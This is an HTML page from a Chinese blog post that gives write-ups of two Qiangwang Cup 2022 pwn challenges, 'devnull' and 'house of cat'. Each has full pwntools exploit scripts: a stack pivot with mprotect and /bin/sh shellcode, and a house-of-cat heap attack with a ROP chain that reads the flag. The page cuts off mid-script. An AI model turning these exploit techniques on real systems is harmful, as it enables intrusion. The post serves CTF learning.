@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="强网杯2022部分pwn题复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2022pwn题复现">
+<meta property="og:url" content="http://example.com/2022/08/13/%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Leof&#39;s blog">
+<meta property="og:description" content="强网杯2022部分pwn题复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131026630.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131107816.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131111206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131114734.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131116100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208141131871.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208141138524.png">
+<meta property="article:published_time" content="2022-08-13T02:13:57.000Z">
+<meta property="article:modified_time" content="2023-03-31T14:57:11.750Z">
+<meta property="article:author" content="Leof">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="强网杯2022">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131026630.png">
+
+<link rel="canonical" href="http://example.com/2022/08/13/%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2022pwn题复现 | Leof's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leof's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/13/%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Leof">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leof's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2022pwn题复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-13 10:13:57" itemprop="dateCreated datePublished" datetime="2022-08-13T10:13:57+08:00">2022-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-31 22:57:11" itemprop="dateModified" datetime="2023-03-31T22:57:11+08:00">2023-03-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>强网杯2022部分pwn题复现</p>
+<span id="more"></span>
+
+<h1 id="devnull"><a href="#devnull" class="headerlink" title="devnull"></a>devnull</h1><p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131026630.png"></p>
+<p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131107816.png" alt="QQ截图20220813110725"></p>
+<p>一开始fgets读入可以使fd为0，后面的read就是我们标准输入的了，第一次read用于栈迁移，第二次用于读入我们的payload</p>
+<p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131111206.png"></p>
+<p>可以看到是没有可执行权限的，不过程序有mprotect，可以用来改权限</p>
+<p>接下来就是参数的问题了，rdx在最后输出thanks\n之后刚好为7</p>
+<p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131114734.png"></p>
+<p>找到这段gadget可以控制rsi，而rdi可以由rax控制，接下来去找可以控制rax的gadget</p>
+<p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208131116100.png"></p>
+<p>通过ROPgadget找到如下gadget，把rbp溢出为一段可写的地址即可</p>
+<p>需要注意的是程序关闭的标准输出流，我们可以使用命令<code>exec 1&gt;&amp;2</code>来将标准输出和标准错误给绑定到一起</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./devnull&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fd -&gt; 0</span></span><br><span class="line">sa(<span class="string">b&#x27;please input your filename&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">write_able = <span class="number">0x3fc000</span> + <span class="number">0x1000</span></span><br><span class="line">leave_ret = <span class="number">0x401354</span></span><br><span class="line">mprotect = <span class="number">0x4012D0</span>     <span class="comment"># mov esi, 0x1000; mov rdi, rax; call _mprotect; nop; pop rbp; ret</span></span><br><span class="line">magic = <span class="number">0x401350</span>        <span class="comment">#mov rax, rbp - 0x18;leave_ret</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x401463&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(write_able) + p64(write_able + <span class="number">0x18</span>) + p64(magic)</span><br><span class="line">sa(<span class="string">b&#x27;Please write the data you want to discard&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(write_able) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">3</span> + p64(mprotect) + p64(<span class="number">0</span>) + p64(write_able + <span class="number">0x38</span>) + asm(shellcraft.execve(write_able + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">sa(<span class="string">b&#x27;please input your new data&#x27;</span>, payload)</span><br><span class="line">sl(<span class="string">b&#x27;exec 1&gt;&amp;2&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p><img src="https://raw.githubusercontent.com/Le0f/imagedata/master/data/202208141131871.png"></p>
+<p>禁用了execve，程序会检查read的fd是否为0，这里可以先close(0)再open，这样flag的fd就为0了</p>
+<p>只有两次edit的机会，删除堆块的时候指针未置0，uaf</p>
+<p>利用思路：</p>
+<ol>
+<li>利用uaf泄露libc基址和堆地址</li>
+<li>伪造_IO_FLE</li>
+<li>第一次large bin attck打stderr</li>
+<li>第二次large bin attack打top chunk size</li>
+<li>触发__malloc_assert进入house of cat 的利用链</li>
+<li>执行orw</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./house_of_cat&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;LOGIN | r00t QWBQWXF admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#0 -&gt; large bin</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x430</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase = uu64() - <span class="number">0x21a0d0</span></span><br><span class="line">setcontext = libcbase + <span class="number">0x53A6D</span></span><br><span class="line">IO_wfile_jumps = libcbase + <span class="number">0x2160c0</span></span><br><span class="line">stderr = libcbase + <span class="number">0x21a860</span></span><br><span class="line">open_addr = libcbase + <span class="number">0x114690</span></span><br><span class="line">write_addr = libcbase + <span class="number">0x114a20</span></span><br><span class="line">read_addr = libcbase + <span class="number">0x114980</span></span><br><span class="line">close_addr = libcbase + <span class="number">0x115100</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;setcontext&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;IO_wfile_jumps&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;stderr&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">10</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line">flag_addr = heapbase + <span class="number">0x6d0</span></span><br><span class="line">lg(<span class="string">&#x27;flag_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libcbase + <span class="number">0x11f497</span></span><br><span class="line">pop_rax = libcbase + <span class="number">0x45eb0</span></span><br><span class="line">ret = libcbase + <span class="number">0x29cd6</span></span><br><span class="line">syscall = libcbase + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">fake_io_addr = heapbase + <span class="number">0xae0</span>     <span class="comment">#2</span></span><br><span class="line">rop_addr = heapbase + <span class="number">0x1350</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps + <span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">payload = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(rop_addr) + p64(ret)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, payload) <span class="comment">#4 &amp;&amp; 2 uaf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#large bin attack stderr</span></span><br><span class="line">edit(<span class="number">0</span>, p64(libcbase + <span class="number">0x21a0d0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(stderr - <span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(close_addr)   <span class="comment">#close(0) fd-&gt;0</span></span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(syscall) <span class="comment">#open(flag, 0)</span></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heapbase) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) * <span class="number">2</span> + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x440</span>, orw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#large bin attack top chunk size</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x440</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x438</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x438</span>)</span><br><span 